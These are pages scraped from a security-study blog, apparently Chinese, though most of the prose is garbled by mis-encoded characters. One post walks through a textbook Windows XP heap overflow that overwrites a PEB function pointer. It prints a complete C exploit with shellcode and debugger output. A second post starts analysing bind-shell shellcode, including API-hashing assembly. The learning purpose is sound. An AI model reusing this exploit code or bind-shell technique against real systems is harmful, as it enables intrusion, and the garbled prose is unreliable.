<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920162918303.png" alt="image-20220920162918303"></p>
<p>åœ¨è¯¥æ¬¡åˆ†é…å‰,å°†h5çš„ä¸¤ä¸ªæŒ‡é’ˆå…ˆæ”¹æ‰</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163203070.png" alt="ä¿®æ”¹ä¹‹å‰"></p>
<p>ä¿®æ”¹ä¹‹å</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163323743.png" alt="ä¿®æ”¹ä¹‹å"></p>
<p>ç„¶åå•æ­¥æ­¥è¿‡æ‰§è¡Œè¯¥åˆ†é…å‡½æ•°,</p>
<p>æ­¤æ—¶æ§åˆ¶è·³è½¬åˆ°0x77CCAADä½ç½®,è¿™åº”è¯¥æ˜¯åœ¨HeapAllocåº“å‡½æ•°æˆ–è€…å…¶è°ƒç”¨å‡½æ•°ä¸­äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163836240.png" alt="image-20220920163836240"></p>
<p>å°è¯•å°†ecxä¸­çš„æ•°æ®å†™åˆ°å†…å­˜ä¸Šds:[EDX],dså³ç¨‹åºæ•°æ®æ®µé€‰æ‹©å­,æ­¤æ—¶ECXå’ŒEDXå°±æ˜¯æˆ‘ä»¬èµ‹çš„ä¸¤ä¸ªå€¼</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163956631.png" alt="image-20220920163956631"></p>
<p>ollydbgå·²ç»æŠ¥é”™</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163624121.png" alt="å¯„äº†"></p>
<h3 id="åˆ©ç”¨DWORD-SHOOT"><a href="#åˆ©ç”¨DWORD-SHOOT" class="headerlink" title="åˆ©ç”¨DWORD SHOOT"></a>åˆ©ç”¨DWORD SHOOT</h3><blockquote>
<p>åˆ©ç”¨ç‚¹:</p>
<p>å†…å­˜å˜é‡</p>
<p>ä»£ç é€»è¾‘</p>
<p>è¿”å›åœ°å€</p>
<p>å¼‚å¸¸å¤„ç†æœºåˆ¶</p>
<p>å‡½æ•°æŒ‡é’ˆ</p>
<p>PEBçº¿ç¨‹åŒæ­¥å‡½æ•°å…¥å£åœ°å€</p>
</blockquote>
<p>ä¹¦ä¸Šçš„å®éªŒé€‰å®šå—å®³è€…æ˜¯RtlEnterCriticalSectionå‡½æ•°æŒ‡é’ˆ</p>
<p>è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯åŒæ­¥ä¸€ä¸ªè¿›ç¨‹çš„ä¸åŒçº¿ç¨‹,RtlEnterCriticalSectionå’ŒRtlCriticalSectionå‡½æ•°æ˜¯è®¿é—®ä¸´ç•ŒåŒºæ—¶éœ€è¦è°ƒç”¨çš„,ä¿è¯çº¿ç¨‹å¯¹ä¸´ç•ŒåŒºçš„è®¿é—®äº’æ–¥</p>
<p>è¿›ç¨‹é€€å‡ºæ—¶,ExitProcesså‡½æ•°ä¼šè°ƒç”¨è¿™ä¸¤ä¸ªä¸´ç•ŒåŒºå‡½æ•°,ä½†æ˜¯è°ƒç”¨æ–¹å¼æ˜¯å‡½æ•°æŒ‡é’ˆ</p>
<p>è¿™ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆåœ¨PEB+0x20å¤„</p>
<p>RtlEnterCriticalSection@0x7FFDF020</p>
<p>RtlLeaveCriticalSection@0x7FFDF024</p>
<h4 id="åˆ©ç”¨ç¨‹åº"><a href="#åˆ©ç”¨ç¨‹åº" class="headerlink" title="åˆ©ç”¨ç¨‹åº"></a>åˆ©ç”¨ç¨‹åº</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="string">&quot;\xB8\x20\xF0\xFD\x7F&quot;</span>  <span class="comment">//MOV EAX,7FFDF020</span></span><br><span class="line"><span class="string">&quot;\xBB\x4C\xAA\xF8\x77&quot;</span>  <span class="comment">//MOV EBX,77F82060h the address here may releated to your OS</span></span><br><span class="line"><span class="string">&quot;\x89\x18&quot;</span>				<span class="comment">//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">&quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;</span>;</span><br><span class="line"><span class="comment">//0x00360688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">//used to break the process</span></span><br><span class="line">	<span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>h1å‘hpå †ç”³è¯·äº†200å­—èŠ‚çš„ç©ºé—´,ä½†æ˜¯memcpyä¸­å´å…è®¸å¾€é‡Œæ”¾0x200&#x3D;512å­—èŠ‚</p>
<p>è€Œh1åé¢ç´§è·Ÿç€çš„å°±æ˜¯å°¾å—,å¦‚æœå¾€h1ä¸Šå†™å…¥å¤šä½™200ä¸ªå­—èŠ‚,å°±æŠŠå°¾å—æº¢å‡ºäº†</p>
<p>å°†å°¾å—çš„é¦–éƒ¨çš„æŒ‡å‘Freelist[0]çš„ä¸¤ä¸ªæŒ‡é’ˆæº¢å‡ºä¿®æ”¹,å†å‘ç”Ÿåˆ†é…çš„æ—¶å€™å°±DWORD SHOOTäº†</p>
<p>å¯ä»¥å°†PEBä¸­çš„RtlEnterCriticalSection@0x7FFDF020è¿™ä¸ªæŒ‡é’ˆä¿®æ”¹ä¸ºshellcode</p>
<p>DWORDSHOOTä¹‹åå †å¼‚å¸¸,ç¨‹åºä¼šè°ƒç”¨ExitProcessç»“æŸè¿›ç¨‹</p>
<p>ExitProcessä¼šè°ƒç”¨0x7FFDF020å¤„çš„å‡½æ•°æŒ‡é’ˆ,ä½†æ˜¯è¿™ä¸ªæŒ‡é’ˆå·²ç»è¢«æº¢å‡ºæˆshellcodeäº†,äºæ˜¯shellcodeå°±æ‰§è¡Œäº†</p>
<h4 id="è°ƒè¯•è§‚å¯Ÿ"><a href="#è°ƒè¯•è§‚å¯Ÿ" class="headerlink" title="è°ƒè¯•è§‚å¯Ÿ"></a>è°ƒè¯•è§‚å¯Ÿ</h4><p>int 3ä¸­æ–­æ—¶,åˆšæ‰§è¡Œå®Œ<code>h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200);</code></p>
<p>eax&#x3D;0x360688,å³h1å¥æŸ„,h1å †çš„å¤§å°200&#x3D;0xC8å­—èŠ‚,dataå æ®äº†[0x360688,0x0x360750)</p>
<p>é‚£ä¹ˆå°¾å—çš„é¦–éƒ¨å°±å¾—åœ¨0x360750</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920211125615.png" alt="image-20220920211125615"></p>
<p>0x758å¼€å§‹çš„å…«ä¸ªå­—èŠ‚æ˜¯å°¾å—çš„ä¸¤ä¸ªæŒ‡å‘Freelist[0]çš„æŒ‡é’ˆ</p>
<p>ç„¶åæ˜¯å°†shellcodeæ‹·è´åˆ°h1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00401026   B9 80000000      MOV ECX,80;é‡å¤æ‹·è´æ¬¡æ•°,0x80æ¬¡</span><br><span class="line">0040102B   BE 30604000      MOV ESI,heap_PEB.00406030;shellcodeä½œä¸ºæºåœ°å€</span><br><span class="line">00401030   8BF8             MOV EDI,EAX;h1-&gt;eax-&gt;ediä½œä¸ºç›®çš„åœ°å€</span><br><span class="line">00401037   F3:A5            REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI];æ¯æ¬¡ä»ESIæŒ‡å‘çš„å†…å­˜ä¸Šæ‹¿å‡ºä¸€ä¸ªåŒå­—æ‹·è´åˆ°ediæŒ‡å‘çš„å†…å­˜ä¸Š</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¦‚æ­¤æ€»å…±æ‹·è´äº†0x80*4&#x3D;512å­—èŠ‚,æ˜¾ç„¶è¦æº¢å‡ºå°¾å—äº†.</p>
<p>æ‹·è´å®Œæˆåå†çœ‹å°¾å—</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920212207155.png" alt="image-20220920212207155"></p>
<p>å°¾å—çš„flinkå·²ç»æº¢å‡ºä¿®æ”¹ä¸º0x360688,è¿™æ˜¯shellcodeçš„èµ·å§‹åœ°å€</p>
<p>å°¾å—çš„blinkå·²ç»æº¢å‡ºä¿®æ”¹æˆ0x7F7D7020,è¿™æ˜¯PEBä¸­çº¿ç¨‹åŒæ­¥å‡½æ•°æŒ‡é’ˆçš„åœ°å€</p>
<p>å°¾å—é¦–çš„å‰8å­—èŠ‚æº¢å‡ºå€¼ä»ç„¶æ˜¯åˆæ³•çš„é¦–éƒ¨å€¼,è¿™æ˜¯ä¸ºäº†é˜²æ­¢ç¨‹åºåœ¨DWORD SHOOTå‰å¯„æ‰,ä»–çœŸçš„,æˆ‘å“­æ­»</p>
<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>shellcodeæœ‰ä¸¤ä¸ªç³»ç»Ÿç›¸å…³çš„æ•°å€¼,ä¸€ä¸ªæ˜¯NTDLL.DLLä¸­RtlEnterCriticalSectionè¿™ä¸ªå‡½æ•°çš„åœ°å€,è¿™ä¸ªå¯ä»¥ä½¿ç”¨dependency walkeræŸ¥</p>
<p>å¦ä¸€ä¸ªæ˜¯shellcodeå°†ä¼šè¢«åŠ è½½è¿›å…¥è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´çš„å“ªé‡Œ,è¿™ä¸ªå¯ä»¥å…ˆè°ƒè¯•è§‚å¯Ÿä¸€æ¬¡,ç„¶åä¿®æ”¹shellcode</p>
<p>ä½¿ç”¨å†…è”æ±‡ç¼–<strong>åŠ è½½å™¨</strong>åŠ è½½shellcode,è§‚å¯Ÿè¿™æ®µä»£ç å¹²äº†å•¥</p>
<h5 id="ä¿®å¤PEBä¸´ç•ŒåŒºæ§åˆ¶å‡½æ•°"><a href="#ä¿®å¤PEBä¸´ç•ŒåŒºæ§åˆ¶å‡½æ•°" class="headerlink" title="ä¿®å¤PEBä¸´ç•ŒåŒºæ§åˆ¶å‡½æ•°"></a>ä¿®å¤PEBä¸´ç•ŒåŒºæ§åˆ¶å‡½æ•°</h5><p>ç”±äºshellcodeæ‰§è¡Œä¹‹å,è¿˜éœ€è¦è°ƒç”¨RtlEnterCriticalSectionè¿™ä¸ªå‡½æ•°æŒ‡é’ˆ,ä½†æ˜¯ä¹‹å‰ä¸ºäº†èƒ½å¤Ÿè®©shellcodeæ‰§è¡Œ,å·²ç»æŠŠè¿™ä¸ªå‡½æ•°æŒ‡é’ˆæ”¹æˆäº†shellcodeçš„åœ°å€,ä¹Ÿå°±æ˜¯è¯´shellcodeæ‰§è¡Œä¹‹åæ‰€æœ‰å¯¹RtlEnterCriticalSectionå‡½æ•°çš„è°ƒç”¨ä¼šé‡æ–°æ‰§è¡Œshellcode,è¿›è¡Œä¸ä¸‹å»äº†,è¿™æ ·å¼¹ä¸å‡ºçª—å£æ¥,éœ€è¦åœ¨shellcodeèµ·æ¥ä¹‹å,é¦–å…ˆæŠŠRtlEnterCriticalSectionçš„å€¼æ”¹å›å»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00424B08   mov         eax,7FFDF020h	;ç¨‹åºPEBä¸­çº¿ç¨‹åŒæ­¥å‡½æ•°çš„åœ°å€ RtlEnterCriticalSectionå‡½æ•°æŒ‡é’ˆçš„ä½ç½®.æ”¾åˆ°eaxä¸­</span><br><span class="line">00424B0D   mov         ebx,77F82060h	;NTDLL.DLLåº“ä¸­RtlEnterCriticalSectionçš„åœ°å€,æ”¾åˆ°ebxä¸­</span><br><span class="line">00424B12   mov         dword ptr [eax],ebx;å°†ebxå€¼èµ‹å€¼åˆ°eaxæŒ‡å‘çš„å†…å­˜åœ°å€,ä¹Ÿå°±æ˜¯æŠŠNTDLL.DLLä¸­,RtlEnterCriticalSectionå‡½æ•°åœ°å€æ”¾åˆ°äº†PEBä¸­çš„å‡½æ•°æŒ‡é’ˆä¸Š</span><br></pre></td></tr></table></figure>

<h5 id="ä¸‰å±‚å¾ªç¯è§£æå‡½æ•°åœ°å€-å¼¹çª—"><a href="#ä¸‰å±‚å¾ªç¯è§£æå‡½æ•°åœ°å€-å¼¹çª—" class="headerlink" title="ä¸‰å±‚å¾ªç¯è§£æå‡½æ•°åœ°å€,å¼¹çª—"></a>ä¸‰å±‚å¾ªç¯è§£æå‡½æ•°åœ°å€,å¼¹çª—</h5><p>å‰©ä¸‹çš„shellcodeä¹‹å‰å·²ç»åˆ†æè¿‡äº†</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/18/Bind-shell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/18/Bind-shell/" class="post-title-link" itemprop="url">bindshellé€†å‘åˆ†æ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-18 20:33:00 / Modified: 20:34:13" itemprop="dateCreated datePublished" datetime="2022-09-18T20:33:00+08:00">2022-09-18</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind_shell"></a>Bind_shell</h1><h2 id="å“ˆå¸Œç®—æ³•è®¾è®¡"><a href="#å“ˆå¸Œç®—æ³•è®¾è®¡" class="headerlink" title="å“ˆå¸Œç®—æ³•è®¾è®¡"></a>å“ˆå¸Œç®—æ³•è®¾è®¡</h2><p>1.å“ˆå¸Œç®—æ³•ä¸èƒ½å‘ç”Ÿç¢°æ’,æˆ–è€…è¯´å­˜åœ¨å‘ç”Ÿç¢°æ’çš„å¯èƒ½,ä½†æ˜¯å¯ä»¥è‚¯å®šçš„æ˜¯,é¦–å…ˆåŒ¹é…çš„å°±æ˜¯ç›®æ ‡å‡½æ•°.åŸåˆ™ä¸Šä¸è®¾è®¡å¤„ç†ç¢°æ’çš„ç®—æ³•</p>
<p>2.å‡½æ•°åçš„æ‘˜è¦å€¼å°½å¯èƒ½çŸ­</p>
<p>3.å“ˆå¸Œç®—æ³•è‡ªå·±çš„ç¯‡å¹…å°½é‡çŸ­</p>
<p>4.å“ˆå¸Œåçš„æ‘˜è¦å€¼å¯ä»¥å½“ä½œâ€å‡†nopæŒ‡ä»¤â€,å³åœ¨æ•°å€¼ä¸Šç›¸å½“äºæŸäº›æœºå™¨ç ,ä½†æ˜¯è¿™äº›æœºå™¨ç çš„æ‰§è¡Œä¸ä¼šå¯¹shellcodeäº§ç”Ÿå½±å“.å¦‚æ­¤å¯ä»¥çœå»è·³è½¬æŒ‡ä»¤</p>
<p>ä¹¦ä¸Šé‡‡å–çš„å“ˆå¸Œç®—æ³•æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hash_loop: </span><br><span class="line">	lodsb 					; load next char into al and increment esi </span><br><span class="line">	xor al, 0x71 				; XOR current char with 0x71 </span><br><span class="line">	sub dl, al 				; update hash with current char </span><br><span class="line">	cmp al, 0x71 				; loop until we reach end of string </span><br><span class="line">	jne hash_loop </span><br></pre></td></tr></table></figure>

<p>dlåˆå§‹å€¼ä¸º0,</p>
<p>å°†åº“å‡½æ•°åé€ä¸ªå­—èŠ‚ä¸0x71å¼‚æˆ–ç„¶åç”¨dlå‡å»è¯¥å€¼ç´¯è®¡å“ˆå¸Œå€¼,</p>
<p>æœ€ç»ˆçš„å“ˆå¸Œå€¼æ”¾åœ¨dlä¸­,åªéœ€è¦1ä¸ªå­—èŠ‚</p>
<p>ç”¨è¿™ä¸ªå“ˆå¸Œç®—æ³•å¾—åˆ°çš„å„ä¸ªå‡½æ•°çš„å“ˆå¸Œå€¼:</p>
<table>
<thead>
<tr>
<th>å‡½æ•°å</th>
<th>å“ˆå¸Œå€¼</th>
<th>å‡†nopæŒ‡ä»¤</th>
</tr>
</thead>
<tbody><tr>
<td>LoadLibraryA</td>
<td>0x59</td>
<td>pop ecx</td>
</tr>
<tr>
<td>CreateProcessA</td>
<td>0x91</td>
<td></td>
</tr>
<tr>
<td>ExitProcess</td>
<td>0xc9</td>
<td></td>
</tr>
<tr>
<td>WSAStartup</td>
<td>0xd3</td>
<td>or ecx,0x203062d3</td>
</tr>
<tr>
<td>WSASocketA</td>
<td>0x62</td>
<td></td>
</tr>
<tr>
<td>bind</td>
<td>0x30</td>
<td></td>
</tr>
<tr>
<td>listen</td>
<td>0x20</td>
<td></td>
</tr>
<tr>
<td>accept</td>
<td>0x41</td>
<td>ecx</td>
</tr>
</tbody></table>
<p>ç„¶åç´§è·Ÿç€cmdä¹Ÿå†™ä¸Š</p>
<table>
<thead>
<tr>
<th>Asciiå­—ç¬¦</th>
<th>Asciiå€¼</th>
<th>å‡†nopæŒ‡ä»¤</th>
</tr>
</thead>
<tbody><tr>
<td>C</td>
<td>0x43</td>
<td>inc ebx</td>
</tr>
<tr>
<td>M</td>
<td>0x4d</td>
<td>dec dbp</td>
</tr>
<tr>
<td>d</td>
<td>0x64</td>
<td>FS:</td>
</tr>
</tbody></table>
<p>å‡†nopæŒ‡ä»¤å…¨éƒ½æ˜¯ä¸ç–¼ä¸ç—’çš„æŒ‡ä»¤</p>
<p>å› æ­¤bind-shellä¸€å¼€å§‹æ˜¯è¿™æ ·å†™çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; start of shellcode </span><br><span class="line">; assume: eax points here </span><br><span class="line">; function hashes (executable as nop-equivalent) </span><br><span class="line">	_emit 0x59	; LoadLibraryA ; pop ecx </span><br><span class="line">	_emit 0x81 	; CreateProcessA ; or ecx, 0x203062d3 </span><br><span class="line">	_emit 0xc9 	; ExitProcess </span><br><span class="line">	_emit 0xd3 	; WSAStartup </span><br><span class="line">	_emit 0x62 	; WSASocketA </span><br><span class="line">	_emit 0x30 	; bind </span><br><span class="line">	_emit 0x20 	; listen </span><br><span class="line">	_emit 0x41 	; accept ; inc ecx </span><br><span class="line"></span><br><span class="line">; &quot;CMd&quot; </span><br><span class="line">	_emit 0x43 	; inc ebx </span><br><span class="line">	_emit 0x4d 	; dec ebp </span><br><span class="line">	_emit 0x64 	; FS: </span><br></pre></td></tr></table></figure>



<p>_emitç›¸å½“äºdb,ä½œç”¨æ˜¯å®šä¹‰å­—èŠ‚æ•°æ®</p>
<p>è¿™äº›æ•°æ®ä¼šè¢«å½“åšæŒ‡ä»¤æ‰§è¡Œä¸‹æ¥,ä½†æ˜¯å½±å“ä¸å¤§</p>
<p>ç”¨idaåæ±‡ç¼–è§‚å¯Ÿè¿™ç‰‡åŒºåŸŸ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">59                            pop     ecx</span><br><span class="line">81 C9 D3 62 30 20             or      ecx, 203062D3h</span><br><span class="line">41                            inc     ecx</span><br><span class="line">43                            inc     ebx</span><br><span class="line">4D                            dec     ebp</span><br><span class="line">                              db      64h</span><br></pre></td></tr></table></figure>

<p>åªè¦æ˜¯ä¸å½±å“ç¨‹åºè®¡æ•°å™¨eipçš„æŒ‡ä»¤,æ¯”å¦‚è·³è½¬å’Œè°ƒç”¨,éƒ½å¯ä»¥ä½œä¸ºå‡†nopæŒ‡ä»¤</p>
<p>åé¢çš„æŒ‡ä»¤ä»windows11ä¸Šè°ƒè¯•ä¼šå‘ç”Ÿé”™è¯¯,éœ€è¦åœ¨windowsXPä¸Šè°ƒ</p>
<h2 id="è§£æç¬¦å·"><a href="#è§£æç¬¦å·" class="headerlink" title="è§£æç¬¦å·"></a>è§£æç¬¦å·</h2><p>ç”¨ä¸‰å±‚å¾ªç¯è§£æç¬¦å·,æœ€å¤–åœˆéå†æˆ‘ä»¬è¦æ‰¾çš„ç¬¦å·,ä¸­åœˆéå†åº“å‡½æ•°,å†…åœˆè®¡ç®—ä¸€ä¸ªåº“å‡½æ•°çš„å“ˆå¸Œå€¼ç„¶åå’Œæˆ‘ä»¬çš„å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918111811581.png" alt="image-20220918111811581"></p>
<p>ç”¨ä¼ªä»£ç è¡¨ç¤ºä¸º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(éå†æˆ‘ä»¬ç»™å‡ºçš„ç¬¦å·å“ˆå¸Œè¡¨)&#123;</span><br><span class="line">	<span class="keyword">while</span>(éå†åº“å‡½æ•°åè¡¨)&#123;</span><br><span class="line">		<span class="keyword">while</span>(è®¡ç®—ä¸€ä¸ªåº“å‡½æ•°çš„å“ˆå¸Œå€¼);</span><br><span class="line">		<span class="keyword">if</span>(åº“å‡½æ•°å“ˆå¸Œå€¼=æˆ‘ä»¬ç»™å‡ºçš„å“ˆå¸Œå€¼)&#123;</span><br><span class="line">			<span class="comment">//æ‰¾åˆ°äº†è¯¥ç¬¦å·;</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="comment">//æ²¡æœ‰æ‰¾åˆ°è¯¥ç¬¦å·,å°è¯•ä¸‹ä¸€ä¸ªç”¨åº“å‡½æ•°æ¥è§£ææœ¬ç¬¦å·;</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(æˆ‘ä»¬çš„å“ˆå¸Œè¡¨è§£æåˆ°å¤´)&#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h3 id="å¤–åœˆå¾ªç¯åˆå§‹åŒ–"><a href="#å¤–åœˆå¾ªç¯åˆå§‹åŒ–" class="headerlink" title="å¤–åœˆå¾ªç¯åˆå§‹åŒ–"></a>å¤–åœˆå¾ªç¯åˆå§‹åŒ–</h3><p>ä½¿ç”¨è£…è½½å™¨æ‰§è¡Œbindshellæ—¶,bindshellä¹‹å‰çš„æŒ‡ä»¤æ˜¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea eax,bindshell</span><br><span class="line">push eax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>eaxçš„åˆå§‹å€¼ä¸ºbindshellçš„åŸºåœ°å€,bindshellåœ¨æ ˆä¸­,å› æ­¤eaxçš„åˆå§‹å€¼æ˜¯ä¸€ä¸ªæ ˆä¸­åœ°å€,è¿™å¯¹äºç†è§£åé¢çš„cdqæŒ‡ä»¤æ˜¯æœ‰ä½œç”¨çš„</p>
